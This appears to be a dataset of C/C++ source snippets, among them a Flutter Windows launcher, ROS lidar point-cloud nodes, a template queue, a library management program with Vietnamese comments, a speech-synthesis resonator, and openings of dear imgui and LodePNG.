    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"burgan_task\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// dear imgui, v1.85 WIP\n// (widgets code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Widgets: Text, etc.\n// [SECTION] Widgets: Main (Button, Image, Checkbox, RadioButton, ProgressBar, Bullet, etc.)\n// [SECTION] Widgets: Low-level Layout helpers (Spacing, Dummy, NewLine, Separator, etc.)\n// [SECTION] Widgets: ComboBox\n// [SECTION] Data Type and Data Formatting Helpers\n// [SECTION] Widgets: DragScalar, DragFloat, DragInt, etc.\n// [SECTION] Widgets: SliderScalar, SliderFloat, SliderInt, etc.\n// [SECTION] Widgets: InputScalar, InputFloat, InputInt, etc.\n// [SECTION] Widgets: InputText, InputTextMultiline\n// [SECTION] Widgets: ColorEdit, ColorPicker, ColorButton, etc.\n// [SECTION] Widgets: TreeNode, CollapsingHeader, etc.\n// [SECTION] Widgets: Selectable\n// [SECTION] Widgets: ListBox\n// [SECTION] Widgets: PlotLines, PlotHistogram\n// [SECTION] Widgets: Value helpers\n// [SECTION] Widgets: MenuItem, BeginMenu, EndMenu, etc.\n// [SECTION] Widgets: BeginTabBar, EndTabBar, etc.\n// [SECTION] Widgets: BeginTabItem, EndTabItem, etc.\n// [SECTION] Widgets: Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n#include \"imgui_internal.h\"\n\n// System includes\n#include <ctype.h>      // toupper\n#if defined(_MSC_VER) && _MSC_VER <= 1500 // MSVC 2008 or earlier\n#include <stddef.h>     // intptr_t\n#else\n#include <stdint.h>     // intptr_t\n#endif\n#include <map>\n\n//-------------------------------------------------------------------------\n// Warnings\n//-------------------------------------------------------------------------\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#if defined(_MSC_VER) && _MSC_VER >= 1922 // MSVC 2019 16.2 or later\n#pragma warning (disable: 5054)     // operator '|': deprecated between enumerations of different types\n#endif\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3).\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants (typically 0.0f) is ok.\n#pragma clang diagnostic ignored \"-Wformat-nonliteral\"              // warning: format string is not a string literal            // passing non-literal to vsnformat(). yes, user passing incorrect format strings can crash the code.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wenum-enum-conversion\"           // warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_')\n#pragma clang diagnostic ignored \"-Wdeprecated-enum-enum-conversion\"// warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_') is deprecated\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                          // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wformat-nonliteral\"                // warning: format not a string literal, ",
    "#include <iostream>\n#include <string>\n\n#include <ros/ros.h>\n#include <sensor_msgs/PointCloud2.h>\n#include <pcl_ros/point_cloud.h>\n#include <pcl/point_types.h>\n#include <pcl/registration/icp.h>\n#include <pcl/filters/voxel_grid.h>\n#include <pcl_conversions/pcl_conversions.h>\n#include <geometry_msgs/TransformStamped.h>\n#include <tf2/LinearMath/Quaternion.h>\n#include <tf2_ros/transform_broadcaster.h>\n#include <Eigen/Dense>\n\n\nros::Publisher pub;\nbool first = true;\npcl::PointCloud<pcl::PointXYZ>::Ptr previous_cloud(new pcl::PointCloud<pcl::PointXYZ>());\n\n\n\nvoid lidar_callback(const sensor_msgs::PointCloud2::ConstPtr& msg) {\n  pcl::PointCloud<pcl::PointXYZ>::Ptr cloud(new pcl::PointCloud<pcl::PointXYZ>);\n  pcl::fromROSMsg(*msg, *cloud);\n\n  pcl::VoxelGrid<pcl::PointXYZ> voxel_grid;\n  voxel_grid.setLeafSize(0.5f, 0.5f, 0.5f);\n  voxel_grid.setInputCloud(cloud);\n  voxel_grid.filter(*cloud);\n\n  if (first) {\n    *previous_cloud = *cloud;\n    first = false;\n    return;\n  }\n\n  pcl::IterativeClosestPoint<pcl::PointXYZ, pcl::PointXYZ> icp;\n  icp.setInputSource(previous_cloud);\n  icp.setInputTarget(cloud);\n\n  icp.setMaximumIterations(60);\n  pcl::PointCloud<pcl::PointXYZ> final_cloud;\n  icp.align(final_cloud);\n\n  if (icp.hasConverged()) {\n    std::cout << \"ICP converged.\" << std::endl;\n    Eigen::Matrix4f transformation = icp.getFinalTransformation();\n\n    geometry_msgs::TransformStamped transform_stamped;\n    transform_stamped.header.frame_id = \"previous_cloud\";\n    transform_stamped.child_frame_id = \"current_cloud\";\n    transform_stamped.header.stamp = msg->header.stamp;\n\n    transform_stamped.transform.translation.x = transformation(0, 3);\n    transform_stamped.transform.translation.y = transformation(1, 3);\n    transform_stamped.transform.translation.z = transformation(2, 3);\n\n    Eigen::Matrix3f rotation_matrix = transformation.block<3, 3>(0, 0);\n    Eigen::Quaternionf q(rotation_matrix);\n    transform_stamped.transform.rotation.x = q.x();\n    transform_stamped.transform.rotation.y = q.y();\n    transform_stamped.transform.rotation.z = q.z();\n    transform_stamped.transform.rotation.w = q.w();\n\n    pub.publish(transform_stamped);\n\n    *previous_cloud = *cloud;\n    \n  } else {\n    std::cout << \"ICP did not converge.\" << std::endl;\n  }\n}\n\nint main(int argc, char **argv) {\n  ros::init(argc, argv, \"lidar_node\");\n  ros::NodeHandle nh;\n  ros::Subscriber sub = nh.subscribe(\"/os1_cloud_node/points\", 1, lidar_callback);\n  pub = nh.advertise<geometry_msgs::TransformStamped>(\"/lidar_transform\", 1);\n  ros::spin();\n  return 0;\n}",
    "#include <iostream>\n#include \"Queue.h\"\n\nusing namespace std;\n\ntemplate <typename T>\nQueue<T>::Queue(int capacity)\n {\n    this->capacity = capacity;\n    this->front = this->rear = 0;\n    this->noOfElement = 0;\n    this->data = new T[capacity];\n}\n\ntemplate <typename T>\nQueue<T>::~Queue() {\n    delete[] data;\n}\n\ntemplate <typename T>\nvoid Queue<T>::enqueue(T val) \n{\n    if (isFull()) \n    {\n        throw runtime_error(\"Cannot enqueue to a full queue.\");\n    }\n    data[rear] = val;\n    rear = (rear + 1) % capacity;\n    noOfElement++;\n    if (noOfElement > capacity / 2)\n        reSize(capacity * 2);\n}\n\ntemplate <typename T>\nT Queue<T>::deQueue() \n{\n    if (isEmpty()) \n      {\n        throw runtime_error(\"Cannot dequeue from an empty queue.\");\n      }\n    noOfElement--;\n    T val = data[front];\n    front = (front + 1) % capacity;\n    if (noOfElement > 0 && noOfElement == capacity / 4)\n        reSize((capacity / 2));\n    return val;\n}\n\ntemplate <typename T>\nT Queue<T>::getElementAtFront() \n{\n    if (isEmpty()) \n    {\n        throw runtime_error(\"Cannot access the front element of an empty queue.\");\n    }\n    return data[front];\n}\n\ntemplate <typename T>\nbool Queue<T>::isEmpty() \n{\n    return noOfElement == 0;\n}\n\ntemplate <typename T>\nbool Queue<T>::isFull() \n{\n    return noOfElement == capacity;\n}\n\ntemplate <typename T>\nvoid Queue<T>::reSize(int newCapacity) \n{\n    T* newData = new T[newCapacity];\n    for (int i = 0; i < noOfElement; i++) \n    {\n        newData[i] = data[(front + i) % capacity];\n    }\n    delete[] data;\n    data = newData;\n    capacity = newCapacity;\n    front = 0;\n    rear = noOfElement;\n}\n",
    "#include \"velodyne_process/lidar_header.h\"\n\nros::Publisher pub;\n\nvoid cloud_callBack(const sensor_msgs::PointCloud2ConstPtr& input)\n{\n    // container for original and filtered data\n    pcl::PCLPointCloud2 * cloud = new pcl::PCLPointCloud2;\n    pcl::PCLPointCloud2ConstPtr cloudPtr(cloud); // pointer for dynamic cloud\n    pcl::PCLPointCloud2 cloud_filtered;\n\n    //conversion ROS sensor_msg/PointCloud2 -> pcl lib\uc758 PointCloud2 type \n    pcl_conversions::toPCL(*input, *cloud);\n    \n    // pcl \uc758 VoxelGrid \ud0c0\uc785\n    pcl::VoxelGrid<pcl::PCLPointCloud2> sor;\n    sor.setInputCloud (cloudPtr);\n    // \uc0d8\ud50c\ub9c1 \ud558\ub294 \ubc29\ubc95 \uc774\uac70 \ub108\ubb34 \uc791\uac8c \ud558\uba74 \uc0d8\ud50c\ub9c1 \uc5d0\ub7ec \uba54\uc138\uc9c0 \ub738 \uace0\uac83\uc744 \uc8fc\uc758 \ud558\uc790\n    //leaf size  1cm \uaca9\uc790\uc758 x, y, z \ud06c\uae30\n    sor.setLeafSize (0.05f, 0.05f, 0.05f);\n    sor.filter(cloud_filtered);\n\n    sensor_msgs::PointCloud2 output;\n    //pcl lib PointCLoud2 type -> ROS sensor_msgs data\n    pcl_conversions::moveFromPCL(cloud_filtered, output);\n    pub.publish(output);\n}\n\nint main(int argc, char** argv)\n{\n    ros::init(argc, argv, \"lidar_voxel\");\n    ros::NodeHandle nh;\n\n    ros::Subscriber sub = nh.subscribe(\"/synced/velodyne_points\", 1, cloud_callBack);\n    pub = nh.advertise<sensor_msgs::PointCloud2> (\"lidar_voxel\", 1);\n\n    std::cout << \"voxel complete\" << std::endl;\n\n    ros::spin();\n}",
    "#include <bits/stdc++.h>\nusing namespace std;\n\n// \u0110\u1ecdc file database d\u1ea1ng txt\nfstream book_file(\"@book_database.txt\", ios::app); // ios::app \u0111\u1ec3 \u0111\u1ed5i ch\u1ebf \u0111\u1ed9 qua append mode (th\u00eam k\u00ed t\u1ef1)\nfstream user_file(\"@user_database.txt\", ios::app); // ios::in \u0111\u1ec3 \u0111\u1ecdc file txt\n// Them sach vao thu vien ngay khi khoi tao\n\n// get system date\ntime_t current_time = time(0);\ntm* time_now = localtime(&current_time);  \n// L\u1edbp s\u00e1ch th\u1ef1c hi\u1ec7n ch\u1ee9c n\u0103ng l\u00e0m khung v\u00e0 c\u00e1c ch\u1ee9c n\u0103ng nh\u1eadp in t\u00ecm s\u00e1ch c\u01a1 b\u1ea3n\nclass SACH {\n    public:\n        string id_sach;\n        string tieu_de;\n        string tac_gia;\n        bool cho_muon = 1;\n        tm ngay_muon = {}, ngay_tra = {};\n\n        SACH(){}\n        SACH (string x, string y, string z, string t){\n            this->id_sach = x;\n            this->tieu_de = y; \n            this->tac_gia = z;\n            if(t == \"C\u00f3 th\u1ec3 m\u01b0\u1ee3n\") this->cho_muon = 1;\n            else this->cho_muon = 0;\n        }\n\n        void khoiTaoSach(){\n            cout << endl << \"Th\u00f4ng tin cho s\u00e1ch m\u1edbi th\u00eam v\u00e0o: \" << endl;\n            cout << \"Nh\u1eadp ID c\u1ee7a s\u00e1ch: \"; cin >> id_sach; cin.ignore();\n            cout << \"Nh\u1eadp ti\u00eau \u0111\u1ec1 c\u1ee7a s\u00e1ch: \"; getline(cin, tieu_de); \n            cout << \"Nh\u1eadp t\u00e1c gi\u1ea3 c\u1ee7a s\u00e1ch: \"; getline(cin, tac_gia); \n        }\n\n        void inSach(){\n            cout << endl << left << setw(12) << \"ID: \" << id_sach << endl;\n            cout << left << setw(13) << \"S\u00e1ch: \" << tieu_de << endl;\n            cout << left << setw(15) << \"T\u00e1c gi\u1ea3: \" << tac_gia << endl;\n            if(cho_muon) cout << left << setw(12) <<\"T\u00ecnh tr\u1ea1ng: C\u00f3 th\u1ec3 m\u01b0\u1ee3n\" << endl;\n            else {\n                cout << left << setw(12) << \"T\u00ecnh tr\u1ea1ng: \u0110\u00e3 m\u01b0\u1ee3n\" << endl;\n                cout << left << setw(12) << \"Ng\u00e0y m\u01b0\u1ee3n: \" << ngay_muon.tm_mday << \"/\" << ngay_muon.tm_mon + 1 << \"/\" << ngay_muon.tm_year + 1900 << endl;\n                cout << left << setw(12) << \"Ng\u00e0y tr\u1ea3: \" << ngay_tra.tm_mday << \"/\" << ngay_tra.tm_mon + 1 << \"/\" << ngay_tra.tm_year + 1900 << endl;\n            }\n        }\n\n        void addSachtoDB() {\n            book_file << endl; \n            book_file << left << setw(12) << \"ID: \" << id_sach << endl;\n            book_file << left << setw(13) << \"S\u00e1ch: \" << tieu_de << endl;\n            book_file << left << setw(15) << \"T\u00e1c gi\u1ea3: \" << tac_gia << endl;\n            if (cho_muon) {\n                book_file << left << setw(12) <<\"T\u00ecnh tr\u1ea1ng: C\u00f3 th\u1ec3 m\u01b0\u1ee3n\" << endl;\n            } else {\n                book_file << left << setw(12) << \"T\u00ecnh tr\u1ea1ng: \u0110\u00e3 m\u01b0\u1ee3n\" << endl;\n                book_file << left << setw(12) << \"Ng\u00e0y m\u01b0\u1ee3n: \" << ngay_muon.tm_mday << \"/\" << ngay_muon.tm_mon + 1 << \"/\" << ngay_muon.tm_year + 1900 << endl;\n                book_file << left << setw(12) << \"Ng\u00e0y tr\u1ea3: \" << ngay_tra.tm_mday << \"/\" << ngay_tra.tm_mon + 1 << \"/\" << ngay_tra.tm_year + 1900 << endl;\n            }\n        }\n\n\n        // T\u00ecm s\u00e1ch qua id (user truy\u1ec1n t\u1eeb input)\n        string timSach(string find_id){\n            if(find_id == id_sach){\n                return find_id;\n            } else return \"none\";\n        }\n\n        ~SACH(){};\n};\n\nvector<SACH*> thu_vien;\n\n// Flow cho reader: \u0111\u0103ng nh\u1eadp ch\u1ec9 b\u1eb1ng S\u0110T, kh\u1ecfi t\u1ea1o ngay khi user ch\u1ea1y code\nclass DOCGIA{\n    protected:\n        // kh\u00f4ng d\u00f9ng n\u00ean n\u00e9m v\u00f4 private hay protected c\u0169ng \u0111\u01b0\u1ee3c -.- \n        string dia_chi;\n        string email;\n\n    public: \n        // l\u01b0\u1eddi vi\u1ebft h\u00e0m truy c\u1eadp bi\u1ebfn n\u00ean cho truy c\u1eadp public lu\u00f4n\n        string ho_ten;\n        string sdt;\n        vector<SACH*> sach_muon;\n\n        DOCGIA(){}\n        DOCGIA (string x, string y, string z, string t, vector<string> g){\n            ho_ten = x;\n            sdt = y; \n            dia_chi = z;\n            email = t;\n            for (auto a:g){\n                for(auto b:thu_vien){\n                    if(a == b->timSach(a)){\n                        sach_muon.push_back(b);\n                    }\n                }\n            }\n        }\n        \n        // Th\u00eam function nh\u1eadp, in, n\u00e9m v\u00e0o database cho user (d\u00f9ng form \u0111\u00e3 c\u00f3 s\u1eb5n nh\u01b0 l\u1edbp SACH)\n        // th\u00eam l\u01b0u user vao database\n        void khoiTaoUser(){\n            cout << endl << \"\u0110\u0103ng k\u00ed t\u00e0i kho\u1ea3n m\u1edbi: \" << endl;\n            cout << \"Nh\u1eadp S\u0110T c\u1ee7a b\u1ea1n: \"; getline(cin, sdt); \n            cout << \"Ch\u00fang t\u00f4i g\u1ecdi b\u1ea1n l\u00e0: \"; getline(cin, ho_ten); \n            cout << \"Nh\u1eadp \u0111\u1ecba ch\u1ec9 c\u1ee7a b\u1ea1n: \"; getline(cin, dia_chi); \n            cout << \"Nh\u1eadp email c\u1ee7a b\u1ea1n: \"; getline(cin, email);\n        }\n\n        void addUserToDB(){\n            user_file << endl << left << setw(15) << \"H\u1ecd v\u00e0 t\u00ean: \" << ho_ten << endl;\n            user_file << left << setw(12) << \"S\u0110T: \" << sdt << endl;\n            user_file << left << setw(16) << \"\u0110\u1ecba ch\u1ec9: \" << dia_chi << endl;\n            user_file << left << setw(11) << \"Email: \" << email << endl;\n            user_file << \"S\u00e1ch \u0111ang m\u01b0\u1ee3n: \" << endl;\n            for(auto a: sach_muon){\n                user_file << \"-   ID: \" << a->id_sach << endl;\n            }\n        }\n\n        void inUser(){\n            cout << endl << left << setw(15) << \"H\u1ecd v\u00e0 t\u00ean: \" << ho_ten << endl;\n    ",
    "#include <math.h>\n#include \"resonator.h\"\n\n#ifndef PI\n#define PI 3.1415926535897932384626433832795f\n#endif\n\n/* Convert formant freqencies and bandwidth into resonator difference equation coefficents\n\t*/\nvoid resonator::initResonator(\n\tint aFrequency,                       /* Frequency of resonator in Hz  */\n\tint aBandwidth,                      /* Bandwidth of resonator in Hz  */\n\tint aSamplerate)\n{\n\tfloat arg = (-PI / aSamplerate) * aBandwidth;\n\tfloat r = (float)exp(arg);  \n\tmC = -(r * r);             \n\targ = (-2.0f * PI / aSamplerate) * aFrequency;\n\tmB = r * (float)cos(arg) * 2.0f;   \n\tmA = 1.0f - mB - mC;    \n}\n\n/* Convert formant freqencies and bandwidth into anti-resonator difference equation constants\n\t*/\nvoid resonator::initAntiresonator(\n\tint aFrequency,                       /* Frequency of resonator in Hz  */\n\tint aBandwidth,                      /* Bandwidth of resonator in Hz  */\n\tint aSamplerate)\n{\n\tinitResonator(aFrequency, aBandwidth, aSamplerate); /* First compute ordinary resonator coefficients */\n\t/* Now convert to antiresonator coefficients */\n\tmA = 1.0f / mA;             /* a'=  1/a */\n\tmB *= -mA;                  /* b'= -b/a */\n\tmC *= -mA;                  /* c'= -c/a */\n}\n\n/* Generic resonator function */\nfloat resonator::resonate(float input)\n{\n\tfloat x = mA * input + mB * mP1 + mC * mP2;\n\tmP2 = mP1;\n\tmP1 = x;\n\treturn x;\n}\n\n/* Generic anti-resonator function\n\tSame as resonator except that a,b,c need to be set with initAntiresonator()\n\tand we save inputs in p1/p2 rather than outputs.\n\tThere is currently only one of these - \"mNasalZero\"\n*/\n/*  Output = (mNasalZero.a * input) + (mNasalZero.b * oldin1) + (mNasalZero.c * oldin2) */\n\nfloat resonator::antiresonate(float input)\n{\n\tfloat x = mA * input + mB * mP1 + mC * mP2;\n\tmP2 = mP1;\n\tmP1 = input;\n\treturn x;\n}\n\nresonator::resonator()\n{\n\tmA = mB = mC = mP1 = mP2 = 0;\n}\n\nresonator::~resonator()\n{\n}\n\nvoid resonator::setGain(float aG)\n{\n\tmA *= aG;\n}\n\n",
    "#include<iostream>\nusing namespace std;\ntemplate<class T>\nvoid create(T*p,int size)\n{\n    int i;\n    for(i=0;i<size;i++)\n    {\n        cout<<\"enter the elements of array:\"<<endl;\n        cin>>p[i];\n    }\n}\ntemplate<class T>\nvoid show(T*p, int size)\n{\n    int i;\n    cout<<\"elements of the array:\\n\"<<endl;\n    for(i=0; i<size;i++)\n    {\n        cout<<\" \"<<p[i];\n        \n        \n    }\n}\ntemplate<class T>\nvoid sort(T*arr,int size)\n{\n    int i,j,k;\n    T l;\n    for(i=0;i<size-1;i++)\n    {\n        k=i;\n        for(j=i+1; j<size;j++)\n        {\n            if(arr[j]<arr[k])\n            {\n                k=j;\n            }\n        }\n        l=arr[i];\n        arr[i]=arr[k];\n        arr[k]=l;\n    }\n}\nint main()\n{\n    int size,size1;\n    cout<<\"enter the size of array:\"<<endl;\n    cin>>size;\n    int arr[size];\n    create(arr,size);\n    show(arr,size);\n    cout<<endl;\n    cout<<\"array after sorting:\"<<endl;\n    sort(arr,size);\n    show(arr,size);\n    cout<<endl;\n    cout<<\"with float values\"<<endl;\n    cout<<\"enter the size of float array:\\n\"<<endl;\n    cin>>size1;\n    float arr1[size1];\n    create<float>(arr1,size1);\n    show<float>(arr1,size1);\n    cout<<endl;\n    cout<<\"after sorting float values\"<<endl;\n    sort<float>(arr1,size1);\n    show<float>(arr1,size1);\n    return 0;\n}\n",
    "/*\nLodePNG version 20230410\n\nCopyright (c) 2005-2023 Lode Vandevenne\n\nThis software is provided 'as-is', without any express or implied\nwarranty. In no event will the authors be held liable for any damages\narising from the use of this software.\n\nPermission is granted to anyone to use this software for any purpose,\nincluding commercial applications, and to alter it and redistribute it\nfreely, subject to the following restrictions:\n\n    1. The origin of this software must not be misrepresented; you must not\n    claim that you wrote the original software. If you use this software\n    in a product, an acknowledgment in the product documentation would be\n    appreciated but is not required.\n\n    2. Altered source versions must be plainly marked as such, and must not be\n    misrepresented as being the original software.\n\n    3. This notice may not be removed or altered from any source\n    distribution.\n*/\n\n/*\nThe manual and changelog are in the header file \"lodepng.h\"\nRename this file to lodepng.cpp to use it for C++, or to lodepng.c to use it for C.\n*/\n\n#include \"lodepng.h\"\n\n#ifdef LODEPNG_COMPILE_DISK\n#include <limits.h> /* LONG_MAX */\n#include <stdio.h> /* file handling */\n#endif /* LODEPNG_COMPILE_DISK */\n\n#ifdef LODEPNG_COMPILE_ALLOCATORS\n#include <stdlib.h> /* allocations */\n#endif /* LODEPNG_COMPILE_ALLOCATORS */\n\n#if defined(_MSC_VER) && (_MSC_VER >= 1310) /*Visual Studio: A few warning types are not desired here.*/\n#pragma warning( disable : 4244 ) /*implicit conversions: not warned by gcc -Wall -Wextra and requires too much casts*/\n#pragma warning( disable : 4996 ) /*VS does not like fopen, but fopen_s is not standard C so unusable here*/\n#endif /*_MSC_VER */\n\nconst char* LODEPNG_VERSION_STRING = \"20230410\";\n\n/*\nThis source file is divided into the following large parts. The code sections\nwith the \"LODEPNG_COMPILE_\" #defines divide this up further in an intermixed way.\n-Tools for C and common code for PNG and Zlib\n-C Code for Zlib (huffman, deflate, ...)\n-C Code for PNG (file format chunks, adam7, PNG filters, color conversions, ...)\n-The C++ wrapper around all of the above\n*/\n\n/* ////////////////////////////////////////////////////////////////////////// */\n/* ////////////////////////////////////////////////////////////////////////// */\n/* // Tools for C, and common code for PNG and Zlib.                       // */\n/* ////////////////////////////////////////////////////////////////////////// */\n/* ////////////////////////////////////////////////////////////////////////// */\n\n/*The malloc, realloc and free functions defined here with \"lodepng_\" in front\nof the name, so that you can easily change them to others related to your\nplatform if needed. Everything else in the code calls these. Pass\n-DLODEPNG_NO_COMPILE_ALLOCATORS to the compiler, or comment out\n#define LODEPNG_COMPILE_ALLOCATORS in the header, to disable the ones here and\ndefine them in your own project's source files without needing to change\nlodepng source code. Don't forget to remove \"static\" if you copypaste them\nfrom here.*/\n\n#ifdef LODEPNG_COMPILE_ALLOCATORS\nstatic void* lodepng_malloc(size_t size) {\n#ifdef LODEPNG_MAX_ALLOC\n  if(size > LODEPNG_MAX_ALLOC) return 0;\n#endif\n  return malloc(size);\n}\n\n/* NOTE: when realloc returns NULL, it leaves the original memory untouched */\nstatic void* lodepng_realloc(void* ptr, size_t new_size) {\n#ifdef LODEPNG_MAX_ALLOC\n  if(new_size > LODEPNG_MAX_ALLOC) return 0;\n#endif\n  return realloc(ptr, new_size);\n}\n\nstatic void lodepng_free(void* ptr) {\n  free(ptr);\n}\n#else /*LODEPNG_COMPILE_ALLOCATORS*/\n/* TODO: support giving additional void* payload to the custom allocators */\nvoid* lodepng_malloc(size_t size);\nvoid* lodepng_realloc(void* ptr, size_t new_size);\nvoid lodepng_free(void* ptr);\n#endif /*LODEPNG_COMPILE_ALLOCATORS*/\n\n/* convince the compiler to inline a function, for use when this measurably improves performance */\n/* inline is not available in C90, but use it when supported by the compiler */\n#if (defined(__STDC_VERSION__) && (__STDC_VERSION__ >= 199901L)) || (defined(__cplusplus) && (__cplusplus >= 199711L))\n#define LODEPNG_INLINE inline\n#else\n#define LODEPNG_INLINE /* not available */\n#endif\n\n/* restrict is not available in C90, but use it when supported by the compiler */\n#if (defined(__GNUC__) && (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 1))) ||\\\n    (defined(_MSC_VER) && (_MSC_VER >= 1400)) || \\\n    (defined(__WATCOMC__) && (__WATCOMC__ >= 1250) && !defined(__cplusplus))\n#define LODEPNG_RESTRICT __restrict\n#else\n#define LODEPNG_RESTRICT /* not available */\n#endif\n\n/* Replacements for C library functions such as memcpy and strlen, to support platforms\nwhere a full C library is not available. The compiler can recognize them and compile\nto something as fast. */\n\nstatic void lodepng_memcpy(void* LODEPNG_RESTRICT dst,\n                           const void* LODEPNG_RESTRICT src, size_t size) {\n  size_t i;\n  for(i = 0; i < size; i++) ((char*)dst)[i] = ((const char*)src)[i];\n}\n\nstatic vo",
    "#include <iostream>\n#include <iomanip>\n#include <cmath>\n\nusing namespace std;\n\nclass Complex {\nprivate:\n    float real_part;\n    float imaginary_part;\n\npublic:\n    Complex() : real_part(0.0), imaginary_part(0.0) {}\n    Complex(float real, float imag) : real_part(real), imaginary_part(imag) {}\n\n    Complex operator+(const Complex &second_operand) const {\n        return Complex(real_part + second_operand.real_part, imaginary_part + second_operand.imaginary_part);\n    }\n\n    Complex operator-(const Complex &second_operand) const {\n        return Complex(real_part - second_operand.real_part, imaginary_part - second_operand.imaginary_part);\n    }\n\n    Complex operator*(const Complex &second_operand) const {\n        return Complex(\n            real_part * second_operand.real_part - imaginary_part * second_operand.imaginary_part,\n            real_part * second_operand.imaginary_part + imaginary_part * second_operand.real_part);\n    }\n\n    Complex operator/(const Complex &second_operand) const {\n        float denominator = pow(second_operand.real_part, 2.0) + pow(second_operand.imaginary_part, 2.0);\n        return Complex(\n            (real_part * second_operand.real_part + imaginary_part * second_operand.imaginary_part) / denominator,\n            (imaginary_part * second_operand.real_part - real_part * second_operand.imaginary_part) / denominator);\n    }\n\n    float modulus() const {\n        return sqrtf(pow(real_part, 2.0) + pow(imaginary_part, 2.0));\n    }\n\n    void show() const {\n        cout << \"\\t[\" << fixed << setprecision(2) << real_part << \"] + i [\" << fixed << setprecision(2) << imaginary_part << \"]\" << endl;\n    }\n\n    friend ostream& operator<<(ostream &output, const Complex &a);\n    friend istream& operator>>(istream &input, Complex &a);\n};\n\nostream& operator<<(ostream &output, const Complex &a) {\n    output << \"\\t\u25cf [Answer] -> (\" << fixed << setprecision(2) << a.real_part \n           << \") + i (\" << fixed << setprecision(2) << a.imaginary_part << \")\";\n    return output;\n}\n\nistream& operator>>(istream &input, Complex &a) {\n    cout << \"\\t\u25cf Enter Real Part Of the Complex Number: \";\n    input >> a.real_part;\n    cout << \"\\t\u25cf Enter Imaginary Part Of the Complex Number: \";\n    input >> a.imaginary_part;\n    return input;\n}\n\nint main() {\n    Complex x, y, z;\n    int choice;\n\n    cout << \"Enter Data For Complex Number 1:\\n\";\n    cin >> x;\n    cout << \"Enter Data For Complex Number 2:\\n\";\n    cin >> y;\n\n    do {\n        cout << \"\\nOperation Menu:\" << endl;\n        cout << \"1. ADD Complex Number \" << endl;\n        cout << \"2. SUBTRACT Complex Number\" << endl;\n        cout << \"3. MULTIPLY Complex Number \" << endl;\n        cout << \"4. DIVIDE Complex Number \" << endl;\n        cout << \"5. MODULUS of Complex Numbers\" << endl;\n        cout << \"6. EXIT\" << endl;\n        cout << \"Enter your choice: \";\n        cin >> choice;\n\n        switch (choice) {\n            case 1:\n                z = x + y;\n                cout << z << endl;\n                break;\n            case 2:\n                z = x - y;\n                cout << z << endl;\n                break;\n            case 3:\n                z = x * y;\n                cout << z << endl;\n                break;\n            case 4:\n                z = x / y;\n                cout << z << endl;\n                break;\n            case 5:\n                cout << fixed << setprecision(2) << \"\\nModulus of X is: \" << x.modulus() << endl;\n                cout << fixed << setprecision(2) << \"Modulus of Y is: \" << y.modulus() << endl;\n                break;\n            case 6:\n                cout << \"Exiting...\" << endl;\n                break;\n            default:\n                cout << \"Invalid choice. Please try again.\" << endl;\n        }\n    } while (choice != 6);\n\n    return 